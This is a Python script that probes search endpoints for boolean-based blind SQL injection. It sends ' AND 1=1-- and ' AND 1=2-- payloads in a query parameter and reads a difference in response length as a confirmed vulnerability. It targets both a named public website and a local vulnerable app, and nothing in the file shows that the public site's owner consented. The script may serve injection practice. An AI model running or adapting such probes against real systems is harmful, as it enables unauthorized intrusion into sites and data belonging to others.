import requests
import sys

# Force UTF-8 for Windows console
sys.stdout.reconfigure(encoding='utf-8')


def run_test(target_url):
    print(f"\n🎯 TARGET: {target_url}")
    print("=" * 40)
    
    # 1. Test TRUE condition (1=1)
    len_true = test_payload(target_url, "1=1", "TRUE Condition (Should work)")

    # 2. Test FALSE condition (1=2)
    len_false = test_payload(target_url, "1=2", "FALSE Condition (Should fail)")

    print("\n📊 ANALYSIS:")
    print("-" * 20)
    if len_true != len_false:
        diff = abs(len_true - len_false)
        print(f"✅ VULNERABILITY CONFIRMED!")
        print(f"   There is a difference of {diff} bytes between True and False.")
        print("   The server is processing our SQL logic!")
    else:
        print("❌ No difference detected. Target might be patched or WAF is blocking.")

def test_payload(url, condition, description):
    payload = f"' AND {condition}--"
    print(f"\n🧪 Testing {description}...")
    print(f"   Payload: {payload}")
    
    try:
        response = requests.get(f"{url}?q={payload}", timeout=5)
        length = len(response.text)
        print(f"   Status: {response.status_code}")
        print(f"   Response Length: {length} bytes")
        return length
    except Exception as e:
        print(f"   ❌ Error: {e}")
        return 0

print("🕵️‍♂️ BLIND SQL INJECTION TEST")
print("============================")

# Test 1: Real World (Might be patched)
run_test("https://levelup.melivecode.com/search")

# Test 2: Local Vulnerable App (Should work)
run_test("http://localhost:5001/search")

